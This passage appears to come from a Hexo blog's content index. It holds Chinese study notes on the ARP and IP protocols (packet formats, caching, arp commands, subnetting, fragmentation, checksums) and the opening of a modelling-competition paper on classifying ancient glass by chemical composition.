主机更换了网卡，也就改变了主机的物理地址。当主机从一个网络移到另一个网络时，物理地址没变，但IP地址改变了。·要适应这些变化，会增大维护静态映射表的开销。</p></blockquote><h5 id="用协议实现地址映射："><a href="#用协议实现地址映射：" class="headerlink" title="用协议实现地址映射："></a>用协议实现地址映射：</h5><p>在使用TCP/IP协议的以太网中，<strong>ARP</strong>(Address Resolution Protocol)协议完成将IP地址映射到MAC地址的过程，逆地址解析协议<strong>RARP</strong>(Reverse Address Resolution Protocol)将物理地址映射为IP地址</p><h3 id="ARP的报文格式："><a href="#ARP的报文格式：" class="headerlink" title="ARP的报文格式："></a>ARP的报文格式：</h3><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/ARP的报文格式.png"  /><p style="color:blue; text-indent: 112px;">硬件类型:16bit，定义运行ARP的网络类型，如以太网的硬件类型是1。</p><p style="color:blue; text-indent: 112px;">协议类型:16bit，定义使用ARP的高层协议，如对于IPv4协议，该字段的值是Ox0800。</p><p style="color:blue; text-indent: 112px;">硬件长度:8bit，以字节为单位的物理地址长度，如以太网硬件地址长度为6。</p><p style="color:blue; text-indent: 112px;">协议长度:8bit，以字节为单位的逻辑地址的长度，对于IPv4，该字段为4。<p><p style="color:blue; text-indent: 112px;">操作码:16bit,1表示ARP请求，2表示ARP应答。</p><p style="color:blue; text-indent: 112px;">发送端硬件地址:变长字段，对于以太网该字段长度是6字节</p><p style="color:blue; text-indent: 112px;">发送端逻辑地址:变长字段，对于IPv4地址，该字段长度为4字节。</p><p style="color:rgb(255, 118, 0); text-indent: 112px;">目的端硬件地址:变长字段，对于ARP请求报文，该字段全为0</p><p style="color:blue; text-indent: 112px;">目的端逻辑地址:变长字段，定义目标逻辑地址。</p><p style="color:black;">ARP数据报直接封装在数据链路层的帧中</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/ARP封装.png" style="zoom:80%;" /><h3 id="ARP的运行过程："><a href="#ARP的运行过程：" class="headerlink" title="ARP的运行过程："></a>ARP的运行过程：</h3><h4 id="数据包传输步骤"><a href="#数据包传输步骤" class="headerlink" title="数据包传输步骤"></a>数据包传输步骤</h4><blockquote><ul><li>发送端知道目的端的IP地址。</li><li>IP要求ARP创建一个ARP请求报文，其中包含了发送方的物理地址、发送方的IP地址和目的端的IP地址。目的端的物理地址用0填充</li><li>将报文传递到数据链路层，并在该层中用<strong>发送方的物理地址作为源地址</strong>，<strong>用物理广播地址作为目的地址</strong>，将其封装在一个帧中。</li><li>因为该帧中包含了一个<strong>广播</strong>目的地址，所以同一链路中的每个主机或路由器都接收到这个帧。所有接收到该帧的主机都将其传递到ARP层进行处理。<strong>除了目的端主机以外的所有主机都丢弃该报文</strong>。</li><li>目的主机用一个包含其物理地址的ARP应答报文<strong>单播</strong>做响应。</li><li>发送方接收到这个应答报文，这样它就知道了目标主机的物理地址。</li><li>将IP数据报封装在一个帧中，并单播到目的地址。</li></ul></blockquote><h3 id="ARP高速缓存："><a href="#ARP高速缓存：" class="headerlink" title="ARP高速缓存："></a>ARP高速缓存：</h3><p>当主机A通过ARP请求得到B的物理地址后就将“IP地址—MAC地址”的绑定信息存储在<strong>高速缓存</strong>中。对于后续发往E的分组，可以通过缓存得到物理地址<br>当ARP被询问一个已知IP地址节点的MAC地址时，先在ARP缓存表查看，若存在，就直接返回MAC地址，若不存在，才发送ARP请求向局域网查询。</p><h4 id="缓存表内容："><a href="#缓存表内容：" class="headerlink" title="缓存表内容："></a>缓存表内容：</h4><p>静态项目一直保留在缓存中，直到重新启动计算机为止。</p><p>动态项目随时间推移自动添加和删除，每个动态ARP缓存项的潜在生命周期是10分钟。<br>新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除;<br>如果某个项目已在使用，则又收到2分钟的生命周期;<br>如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h4 id="arp命令的用法"><a href="#arp命令的用法" class="headerlink" title="arp命令的用法:"></a>arp命令的用法:</h4><p>arp命令用于对本地arp缓存进行操作，不会发送ARP请求</p><blockquote><ul><li>arp -a:              列出ARP缓存中的所有条目</li><li>arp -a ip:          列出缓存中与ip对应的条目</li><li>arp -d:              清空arp缓存</li><li>arp -d ip:          删除缓存中与ip对应的条目</li><li>arp -s ip mac : 在arp缓存中添加一个静态arp条目</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
            <tag> ARP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网际协议IP</title>
      <link href="/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/"/>
      <url>/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/</url>
      
        <content type="html"><![CDATA[<h2 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a>网际协议IP</h2><p>[TOC]</p><h3 id="IP协议简介（lP-Internet-Protocol）"><a href="#IP协议简介（lP-Internet-Protocol）" class="headerlink" title="IP协议简介（lP- Internet Protocol）"></a>IP协议简介（lP- Internet Protocol）</h3><ul><li>网际协议IP是TCP/IP最核心的协议，也是最重要的因特网标准协议之一</li><li>IP负责将数据包从源点交付到终点，所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输。</li></ul><h4 id="IP的特性："><a href="#IP的特性：" class="headerlink" title="IP的特性："></a>IP的特性：</h4><blockquote><p style="color:blue;">不可靠:不保证分组成功地送到目的站。任何可靠性的要求必须由上层协议实现。</p></blockquote><blockquote><p style="color:orange;">无连接:IP并不维护任何后续分组的状态信息，每个分组都是相互独立的</p></blockquote><blockquote><p style="color:red;">尽最大努力交付:IP协议尽力发送每个分组，只有当资源用完或网络出现故障时才会发送失败</p></blockquote><h4 id="IP地址及表示方法："><a href="#IP地址及表示方法：" class="headerlink" title="IP地址及表示方法："></a>IP地址及表示方法：</h4><p>IP地址：一个IP地址惟一地标识了Internet上的一台主机，IPv4协议使用32位地址，这表示地址空间是2^32。而IPv6协议使用128位地址，地址空间为2^128。<br>表示方法：点分十进制表示:每个字节用一个十进制数表示。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/IP地址分类.png"/><h5 id="网络号："><a href="#网络号：" class="headerlink" title="网络号："></a>网络号：</h5><p>D类地址和E类地址不划分网络号和主机号。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/网络号.png" style="zoom:67%;" /><h5 id="特殊的IP地址："><a href="#特殊的IP地址：" class="headerlink" title="特殊的IP地址："></a>特殊的IP地址：</h5><blockquote><p style="color:blue;">网络地址:主机号全0的IP地址，不分配给任何主机，作为网络本身的标识</p></blockquote><blockquote><p style="color:orange;">广播地址:主机号为全1的IP地址，用作广播地址，目的地址为广播地址的数据包传递给该网络中的所有节点</p></blockquote><blockquote><p style="color:skyblue;">有限广播地址:32位为全“1”的IP地址(255.255.255.255)，通常由无盘工作站启动时使用，希望从网络IP地址服务器处获得一个IP地址</p></blockquote><blockquote><p style="color:red;">主机本身地址:32位全“0”的IP地址(0.0.0.0)称为主机本身地址</p>- 当一个主机要获得其IP地址时，可以运行一个引导程序，并发送一个以全0为源地址、以全1为目的地址的分组给引导服务器，以获得本主机的IP地址。</blockquote><blockquote><p style="color:black;">环回地址:27.0.0.1称为回环地址，可用来测试TCP/IP协议是否正常工作，常用于本机上软件测试和本机上网络应用程序之间的通信地址。</p>- 使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。</blockquote><h5 id="专用IP地址："><a href="#专用IP地址：" class="headerlink" title="专用IP地址："></a>专用IP地址：</h5><p>专用lIP地址:仅用于专用网内部的本地主机。<br>大多数路由器不转发携带专用IP地址的数据包，本地主机必须经网络地址转换服务器才能访问Internet。<br>专用IP地址范围: </p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/专用IP地址.png" style="zoom:67%;" /><h4 id="子网划分："><a href="#子网划分：" class="headerlink" title="子网划分："></a>子网划分：</h4><p><strong>Subnetting</strong><br>提高IP空间的利用率，增加IP分配的灵活性。<br>从主机号借用若干个比特作为子网号subnet-id，而主机号host-id也就相应减少若干个比特</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p><h4 id="子网掩码："><a href="#子网掩码：" class="headerlink" title="子网掩码："></a>子网掩码：</h4><blockquote><p style="color:blue;">子网掩码是一个网络号全1，主机号全0的32位二进制数，用于确定P中有多少位用于子网号。</p>- **~~表示方法~~**：点分十进制，IP地址后用`/`后面写明网络号的位数- 子网掩码与IP地址**按位做与**得到IP地址对应的**网络地址**</blockquote><h3 id="IP数据格式："><a href="#IP数据格式：" class="headerlink" title="IP数据格式："></a>IP数据格式：</h3><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png"></p><p>IP数据报由首部和数据两部分组成</p><h4 id="各字段的含义："><a href="#各字段的含义：" class="headerlink" title="各字段的含义："></a>各字段的含义：</h4><p>版本:4 bit，指IP协议的版本，目前的IP协议版本号为4(即IPv4)</p><p>首部长度:4 bit，以4字节为单位，因此IP的首部长度最大是60字节</p><p>服务类型: 8 bit，区分服务，一般不用。</p><p>总长度: 16 bit，首部和数据之和的长度，单位为字节，因此数据报的最大长度为65535字节。总长度不能超过网络的最大传输单元MTU。</p><p>标识:16 bit，数据报计数器</p><blockquote><p>IP软件在存储器中维持一个计数器，每产生一个数据报，计数器加1，并将此值赋给标识字段。<br>当数据报由于长度超过网络MTU而必须分片时，标识字段的值就被复制到所有的数据报分片的标识字段中。<br>相同的标识字段的值使分片后的各数据报片能正确重组成原来的数据报。</p></blockquote><p>标志: 3 bit，目前只有两位有意义</p><blockquote><ul><li>第一位保留。</li><li>中间一位记为DF，为不分片标志，只有当DF=0时才允许分片。</li><li>最后一位为MF，MF=1表示后面还有分片，MF=O表示这是最后一个数据报片。</li></ul></blockquote><p>偏移量:13 bit，较长的分组被分片后，某分片在原分组中的相对位置。片偏移以8个字节为单位。每个分片的长度必须是8的整数倍。</p><p>生存时间:8 bit，记为TTL (Time To Live)</p><blockquote><ul><li><p>表明数据报在网络中的寿命，其单位为秒。现在TTL的单位是跳数，指明数据报在因特网中至多可经过多少个路由器，最大值为255，通常为32、64、128。</p></li><li><p>当TTL值为1时，表示这个数据报只能在本局域网内传送，因为这个数据报传送到局域网上的某个路由器，在被转发之前TTL值就减小到0，因而会被路由器丢弃。</p></li></ul></blockquote><p>协议: 8 bit，指出此数据报携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给对应的进程处理。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E9%AB%98%E5%B1%82%E5%8D%8F%E8%AE%AE.png"></p><p>首部检验和:16 bit，检验数据报的首部，不包括数据部分。采用简单的16位反码求和的计算方法。</p><p>源IP地址: 32bit，定义了源主机的IP地址。在IP数据包从源主机传送到目的主机期间，该字段保持不变。</p><p>目的IP地址: 32bit，定义了目的主机的IP地址。在IP数据报从源主机传送到目的主机期间，该字段保持不变。</p><h3 id="IP数据报分片："><a href="#IP数据报分片：" class="headerlink" title="IP数据报分片："></a>IP数据报分片：</h3><p>数据包可能经过多个不同的网络，每一个路由器把收到的帧进行拆装，处理后又封装成另一个帧。<br>收到帧的格式与长度取决于这个帧刚经过的物理网络所使用的协发<br>送出去的帧的格式与长度取决于这个帧将要经过的物理网络所使用的协议。</p><p><strong>最大传输单元MTU</strong>：不同网络所能传送的数据包的最大长度是不同的，这个最大长度叫做最大传输单元MTU ( Maximum Transmission Unit ) </p><blockquote><p style="color:orange;">MTU即该网络的数据链路层帧的数据部分的最大长度。</p></blockquote><h4 id="分片："><a href="#分片：" class="headerlink" title="分片："></a>分片：</h4><blockquote><ul><li><p>对于物理网络，如果数据包的长度超过了MTU，就要把数据部分进行分片。</p></li><li><p>每个分片都有自己的首部。</p></li><li><p>如果已经分片的数据包要经过更小MTU的网络，那么这些已经分片的数据包还可再进行分片，数据包在到达最后终点之前可以经过多次的分片。</p></li><li><p style="color:red;">数据包可以被源主机或在其路径上的路由器进行分片，但是数据包的重装只能在目的主机上进行。</p></li></ul></blockquote><h4 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h4><h5 id="目的主机进行分片重组"><a href="#目的主机进行分片重组" class="headerlink" title="目的主机进行分片重组"></a>目的主机进行分片重组</h5><blockquote><p style="color:blue;">IP规定，数据报分片的重组地点是目的主机，中间路由器不对任何被分片的数据报进行重组，即使其转发接口的MTU非常大。</p></blockquote><blockquote><p>优点:<br>简化了路由软件的操作，提高了路由器的处理效率。<br>可以避免重复分片。在数据报投递过程中，途经网络的MTU是不可预知的</p></blockquote><blockquote><p>缺点<br>浪费带宽。因为每个分片都要有一个首部，分片越多，首部开销越大。<br>增加了数据包丢失的可能性。分片越多，丢失的可能性越大。一旦丢失了一个分片，整个数据报就必须重新传输。</p></blockquote><h5 id="分片重组："><a href="#分片重组：" class="headerlink" title="分片重组："></a>分片重组：</h5><p>有关的三个字段是:标识字段、标志字段和偏移量字段。</p><p>当目的主机收到一个数据报时，可以根据偏移量和MF位判断:</p><ul><li>片偏移不为0，表明它是一个分片;</li><li>如果片偏移为0，且MF位为1，表明它是第一个分片;</li><li>如果片偏移为0，且MF位为0，则表明它是一个完整的数据报。</li></ul><p>根据数据报首部“标识”字段的值，可判断哪些分片属于同一个原始数据报片偏移用来确定分片在原始数据报中的位置。</p><h5 id="重组定时器："><a href="#重组定时器：" class="headerlink" title="重组定时器："></a>重组定时器：</h5><p>为防止因等待一个丢失的分片而无限期延长重组过程，在重组分片时启动一个定时器,如果超时后仍然没有收到一个数据报的全部分片，则该数据报被丢弃。<br>IP数据报校验和：</p><blockquote><p style="color:blue;">校验和：数据包上的附加信息，能够识别数据包在传输过程中是否出错。</p></blockquote><p>发送端先计算校验和，并把得到的结果与数据包一起发送出去。接收端对数据包进行同样的计算。若结果正确，则接受这个数据包，否则就丢弃它。</p><h4 id="校验和的计算："><a href="#校验和的计算：" class="headerlink" title="校验和的计算："></a>校验和的计算：</h4><p>发送端：将数据包按16位分段。把这些段用反码算术运算相加，将相加后得到的和再取反码就得出了校验和。<br>接收端：把收到的数据包按16位分段，并把这些段相加。得到的和取反码。若结果为0，则接受这个数据包，否则拒绝这个数据包。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/校验计算.png" style="zoom: 50%;" /><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><blockquote><blockquote><p style="color:blue;">IP数据包的校验和只校验IP首部部分而不校验IP数据部分。</p></blockquote><ul><li>首先，所有将数据封装在IP数据报中的高层协议，都有覆盖整个数据包的校验和。因此，IP数据报的校验和就不必再检验所封装的数据部分。</li><li>其次，每经过一个路由器，IP数据包的首部就要改变一次，但数据部分不改变。因此若校验和包含数据部分，这就意味着路由器要花费很多时间计算没有改变的数据部分的校验和。</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
            <tag> IP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古代玻璃制品的成分分析与鉴别</title>
      <link href="/2022/11/01/%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
      <url>/2022/11/01/%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="古代玻璃制品的成分分析与鉴别"><a href="#古代玻璃制品的成分分析与鉴别" class="headerlink" title="古代玻璃制品的成分分析与鉴别"></a>古代玻璃制品的成分分析与鉴别</h2><p>[TOC]</p><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>本文基于一批我国古代玻璃制品的相关数据进行了古代玻璃制品的成分分析与鉴别，建立了古代玻璃制品鉴别模型，对各问题进行了分析。</p><p>对于问题一，针对玻璃文物的表面风化与玻璃类型、纹饰和颜色是否具有关系的问题，计算玻璃类型、颜色、纹饰与表面风化的斯皮尔曼系数，分析相关性，得到结论“表面风化和玻璃类型关系最大，和玻璃颜色与纹饰的关系不大”。为预测其风化前的化学成分含量，通过分析文物表面风化前后化学成分含量变化的统计学规律，结合聚类分析及多项式曲线拟合，对风化前数据进行了预测，预测详情数据见支撑材料。</p><p>对于问题二，首先，为得出高钾玻璃和铅钡玻璃的分类规律，将无风化的高钾和铅钡玻璃各化学成分含量的均值曲线进行对比，采用统计学方法分析得出高钾玻璃、铅钡玻璃的分类规律。其次，为解决高钾玻璃和铅钡玻璃的亚类划分问题，运用SPSS工具，采用聚类分析法，依据各样本每种化学成分含量与其他样本各化学成分含量之间的联系进行聚类。聚类完成后再加以统计学分析，寻找其聚为一类的原因并从中提炼分类特征。最终聚类结果为：高钾玻璃分3类，分别为低铅钡玻璃、高磷玻璃、高铜玻璃；铅钡玻璃分5类，分别为高磷玻璃、高钠玻璃、高铝玻璃、钙铁玻璃、高铜玻璃。之后通过计算轮廓系数分析得到模型的合理性，并通过增添样本衡量分类结果的敏感性。</p><p>对于问题三，在对附件表单3中未知类别玻璃文物的化学成分进行分析时先将数据分为无风化和风化，之后经由表单2按照风化、无风化的标准通过箱图、散点图进行数据分析找出适合做自变量的化学成分，确定自变量和因变量从而建立多元回归模型。通过SPSS并依据建立的模型确定影响较高的化学成分进而推测其所属类型。可知高钾玻璃分别是A1、A4、A6、A7，铅钡玻璃分别是A2、A3、A5、A8。在敏感性分析上，更改各项系数中的一项，取附录2中数据代入计算，原计算结果与新数据的变化很明显，数据显著性很强。</p><p>对于问题四，针对不同类别的玻璃文物样品，使用灰色关联分析法分析其化学成分之间的关联关系，得出不同种类的玻璃所含化学成分的关联系数并对其进行排序。通过对不同玻璃类型的数据进行灰色关联分析，得到几组不同的关系系数列表，通过各个关系系数列表的对比，体现不同种类玻璃化学成分关联关系的差异性。</p><p>关键词：<strong>多元回归</strong> <strong>斯皮尔曼系数</strong> <strong>聚类分析</strong> <strong>灰色关联分析</strong> </p><h3 id="一、问题重述"><a href="#一、问题重述" class="headerlink" title="一、问题重述"></a>一、问题重述</h3><h4 id="1-1问题背景"><a href="#1-1问题背景" class="headerlink" title="1.1问题背景"></a>1.1问题背景</h4><p>玻璃的出现与使用在人类的生活里已有四千多年的历史，早期的玻璃在西亚和埃及地区常被制作成珠形饰品。历史上古代玻璃经由丝绸之路传入我国，我国古代玻璃吸收其技术后在本土就地取材制作，因此与外来的玻璃制品外观相似，但化学成分却不相同。从西周到两汉时期中国境内玻璃制品化学成分的演变有自己独特的发展脉络，研究不同时期古代玻璃组成成分，对于了解古代金属冶炼技术与古代丝绸之路等有重大意义。</p><p>在长期的风化过程中，内部的各种氧化物与环境中的各种元素之间存在大量的物理和化学反应，一些组成元素的交换导致其组成比例的变化，这将影响对其类别的正确判断。</p><h4 id="1-2-具体问题重述"><a href="#1-2-具体问题重述" class="headerlink" title="1.2 具体问题重述"></a>1.2 具体问题重述</h4><p>现有一批我国古代玻璃制品的相关数据，考古工作者现已将其分为高钾玻璃和铅钡玻璃两种类型。</p><p>问题一：建立模型确定玻璃文物的表面风化与玻璃类型、纹饰和颜色是否具有关联关系，并根据玻璃类型分析文物表面风化前后化学成分含量变化的统计规律。根据风化点的检测数据，建立预测模型，预测该文物风化前各化学成分的所占比例。</p><p>问题二：由附件表单2中的数据分析高钾玻璃和铅钡玻璃的分类规则；对于每个类别，通过聚类分析选择合适的化学成分来划分其子类，给出具体的分类方法和划分结果，并分析划分结果的合理性和敏感性。</p><p>问题三：对附件表单 3 中未知类别玻璃文物的化学成分分析，鉴别其类型，并对分类结果的敏感性进行分析。</p><p>问题四：分析不同类型的玻璃样品化学组成之间的关联，比较不同类别玻璃文物样品之间关联关系的差异。</p><h3 id="二、问题分析"><a href="#二、问题分析" class="headerlink" title="二、问题分析"></a>二、问题分析</h3><h4 id="2-1对问题一的分析"><a href="#2-1对问题一的分析" class="headerlink" title="2.1对问题一的分析"></a>2.1对问题一的分析</h4><h5 id="2-1-1表面风化与玻璃类型、纹饰和颜色的关系"><a href="#2-1-1表面风化与玻璃类型、纹饰和颜色的关系" class="headerlink" title="2.1.1表面风化与玻璃类型、纹饰和颜色的关系"></a>2.1.1表面风化与玻璃类型、纹饰和颜色的关系</h5><p>分析表面风化与玻璃类型、纹饰和颜色的关系是经典的相关性分析，可以通过皮尔逊系数或斯皮尔曼系数分析相关性。皮尔逊系数进行关联性分析需要呈正态分布且是线性关系的连续变量，而玻璃类型、纹饰、颜色均为定类，而非定量故选择斯皮尔曼系数分析相关性。</p><h5 id="2-1-2文物样品表面有无风化化学成分含量的统计规律"><a href="#2-1-2文物样品表面有无风化化学成分含量的统计规律" class="headerlink" title="2.1.2文物样品表面有无风化化学成分含量的统计规律"></a>2.1.2文物样品表面有无风化化学成分含量的统计规律</h5><p>本文通过聚类分析，将14种不同变量进行聚类，并结合聚类结果，使用多项式曲线拟合，通过对不同指标的关系对风化前的化学成分利用构建的以小二乘法为思路的多元函数表达式进行求解。</p><p>经过数据处理后，可以发现高钾玻璃风化前后化学成分变化具有明显相关性，而铅钡玻璃则不具有明显相关性而无法使用多元线性回归模型求解。</p><p>继续通过多元线性回归模型预测高钾玻璃风化前数据，通过聚类结果并结合统计学规律预测铅钡玻璃风化前成分。</p><h4 id="2-2对问题二的分析"><a href="#2-2对问题二的分析" class="headerlink" title="2.2对问题二的分析"></a>2.2对问题二的分析</h4><p>要从化学成分含量角度分析高钾玻璃、铅钡玻璃的分类规律应建立在玻璃无风化、化学成分含量未被破坏的前提下，根据无风化状态下不同类型玻璃化学成分含量分布曲线，将无风化的高钾和铅钡玻璃各化学成分含量的均值曲线进行对比，分析得出高钾玻璃、铅钡玻璃的分类规律。 </p><p>根据化学成分进行亚分类是一个聚类问题，事先并不知道要分为多少类，我们考虑使用系统聚类法，将各样本作为聚类对象，依据其每种化学成分含量与其他样本各化学成分含量之间的联系进行聚类。系统聚类完成后得出初步聚类结果，而后加以统计学分析，从化学成分含量的角度找出各聚类组合之所以聚为一类的原因，对于一些规律不很明显的组合适当进行人工干预重新组合，提炼出分类特征从而形成类标签，实现基于化学成分的亚类划分。之后通过计算轮廓系数分析得到模型的合理性，并通过增添测试数据衡量分类的敏感性。</p><h4 id="2-3对问题三的分析"><a href="#2-3对问题三的分析" class="headerlink" title="2.3对问题三的分析"></a>2.3对问题三的分析</h4><p>在判别玻璃文物类型前，先将数据划分为无风化的未知类别玻璃文物数据和风化的未知类别玻璃文物数据，之后对表单2的数据规律按照风化和无风化进行总结，找到适合作为自变量的化学成分，确定自变量和因变量从而建立多元回归模型。</p><p>建立回归模型后再通过给予的未知类别玻璃文物数据计算出的预测结果并根据总结出来的数据规律判别是该化学成分属于高钾玻璃还是铅钡玻璃，最后根据哪一种类型可能性更大来决定该未知类别玻璃文物所属类型。</p><p>敏感性分析上更改各项系数中的一项，取附录2中数据代入计算，原计算结果与新数据的变化很明显，数据显著性很强。</p><h4 id="2-4对问题四的分析"><a href="#2-4对问题四的分析" class="headerlink" title="2.4对问题四的分析"></a>2.4对问题四的分析</h4><p>问题四属于相关性分析的问题类型，对于解决此类问题一般可以采用的分析方法包括多元线性回归模型，灰度分析等方法。</p><p>在问题一中，通过散点图和相关性分析可知，存在部分数据并不满足相关性，所以无法完全采用建立多元线性回归模型的方式完成分析，针对相关与不相关数据并存的情况，采用灰度关联分析的方式。求出相应的关联系数。</p><p>不同种类的玻璃其具有差异明显的化学成分关联关系，即具有对应关系系数，对关系系数进行排序，比较不同类别之间的化学成分关联关系的差异性。</p><h3 id="三、模型假设"><a href="#三、模型假设" class="headerlink" title="三、模型假设"></a>三、模型假设</h3><ol><li><p>附件表2中缺失数据部分，视为含量极小可以忽略不计；</p></li><li><p>假设高钾玻璃和铅钡玻璃在分类之初不考虑风化对其的影响；</p></li><li><p>不同类型玻璃，自身突出特性对其他化学成分的掩盖影响在划分亚类时应当剔除；</p></li><li><p>假设实验数据允许存在一定的误差范围；</p></li><li><p>假设在做对比实验时遵循控制变量法，控制其他实验条件完全相同；</p></li></ol><h3 id="四、符号说明及名词定义"><a href="#四、符号说明及名词定义" class="headerlink" title="四、符号说明及名词定义"></a>四、符号说明及名词定义</h3><table><thead><tr><th>符号</th><th>定义</th><th>单位</th></tr></thead><tbody><tr><td><img src="D:\gitee-blog\source\_posts\国赛数学建模\1.jpg" style="zoom:80%;" /></td><td>斯皮尔曼系数</td><td></td></tr><tr><td><img src="D:\gitee-blog\source_posts\国赛数学建模\2.jpg"></td><td>等级差</td><td></td></tr><tr><td><img src="D:\gitee-blog\source_posts\国赛数学建模\3.jpg"></td><td>多项式阶数</td><td>阶</td></tr><tr><td><img src="D:\gitee-blog\source_posts\国赛数学建模\4.jpg"></td><td>比例系数</td><td></td></tr><tr><td>ρ</td><td>分辨系数</td><td></td></tr><tr><td>S</td><td>总轮廓系数</td><td></td></tr><tr><td><img src="D:\gitee-blog\source_posts\国赛数学建模\5.jpg"></td><td>关联度系数列表</td><td></td></tr></tbody></table><h3 id="五、模型的建立与求解"><a href="#五、模型的建立与求解" class="headerlink" title="五、模型的建立与求解"></a>五、模型的建立与求解</h3><h4 id="5-1问题一的求解与分析"><a href="#5-1问题一的求解与分析" class="headerlink" title="5.1问题一的求解与分析"></a>5.1问题一的求解与分析</h4><h5 id="5-1-1表面风化与玻璃类型、纹饰和颜色的关系"><a href="#5-1-1表面风化与玻璃类型、纹饰和颜色的关系" class="headerlink" title="5.1.1表面风化与玻璃类型、纹饰和颜色的关系"></a>5.1.1表面风化与玻璃类型、纹饰和颜色的关系</h5><p>**Step1.**表单1数据可视化</p><p>为了对这些玻璃文物的表面风化与其玻璃类型、纹饰和颜色的关系进行分析，我们首先对表单里的数据进行可视化，使用Python的matplotlib分别展示表面风化与玻璃类型、纹饰和颜色的数量关系条形图。其中，表单1的58个数据中，有3个铅钡风化玻璃的数据它的颜色变量是没有数据的，由于风化后的化学成分变化是不确定的，并且使用完整的55个数据进行可视化分析对表面风化与颜色的关系猜测影响很小，故在该步骤下删去。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps7.jpg"  /></center><center>图5-1 是否风化与玻璃种类的数量关系</center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps8.jpg"  /> <center>图5-2 是否与风化与玻璃纹饰的数量关系</center>![](D:\gitee-blog\source\_posts\国赛数学建模\wps9.jpg)![](D:\gitee-blog\source\_posts\国赛数学建模\wps10.jpg) <center>图5-3 是否风化与玻璃颜色数量关系</center>由折线图可知，铅钡玻璃数量较多，高钾玻璃数量较少。风化的铅钡玻璃数量较少，占比低，整体保存较好；而风化的高钾玻璃数量较多，占比高。其中，未风化的高钾玻璃只有蓝绿A纹玻璃和蓝绿B纹玻璃，高钾玻璃受风化影响较大。<p>**Step2.**斯皮尔曼系数关联性分析</p><p>我们根据条形图的数量关系可以猜测表面风化与玻璃类型间的关系最大，与颜色和纹饰间的关系很小。皮尔逊系数进行关联性分析需要呈正态分布且是线性关系的连续变量，与表单1所给的定类变量而不是连续变量不符合。故我们选择利用斯皮尔曼系数，将定序数据划分等级0或1（风化或未风化，高钾或铅钡）、1<del>8（玻璃颜色）和1</del>3（玻璃纹饰）表示，运用公式（5-1）进行表面风化与玻璃类型、纹饰和颜色的关联性分析得出斯皮尔曼系数<img src="D:\gitee-blog\source\_posts\国赛数学建模\1.jpg" style="zoom:80%;" />。设X，Y为两组数据，其中X为自变量X=(x1, x2, x3)=(类型，纹饰，颜色)，Y为因变量是否表面风化，其斯皮尔曼（等级）相关系数：</p><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps11.jpg"  /> <p>其中，<img src="D:\gitee-blog\source_posts\国赛数学建模\wps15.jpg">为<img src="D:\gitee-blog\source_posts\国赛数学建模\wps16.jpg">和之间的等级差。</p><p>使用SPASS软件，计算斯皮尔曼相关系数，分析各变量与表面风化的关系。呈现结果如下表所示：</p><p>表5-1 斯皮尔曼系数</p><table><thead><tr><th>因变量</th><th>相关系数</th><th>表面风化</th></tr></thead><tbody><tr><td>类型</td><td>相关系数</td><td>0.037</td></tr><tr><td>Sig.(双尾)</td><td>0.781</td><td></td></tr><tr><td>纹饰</td><td>相关系数</td><td>0.344</td></tr><tr><td>Sig.(双尾)</td><td>0.008</td><td></td></tr><tr><td>颜色</td><td>相关系数</td><td>-0.107</td></tr><tr><td>Sig.(双尾)</td><td>0.442</td><td></td></tr></tbody></table><p>通过表格可见，斯皮尔曼相关系数<img src="D:\gitee-blog\source\_posts\国赛数学建模\1.jpg" style="zoom:80%;" /></p>  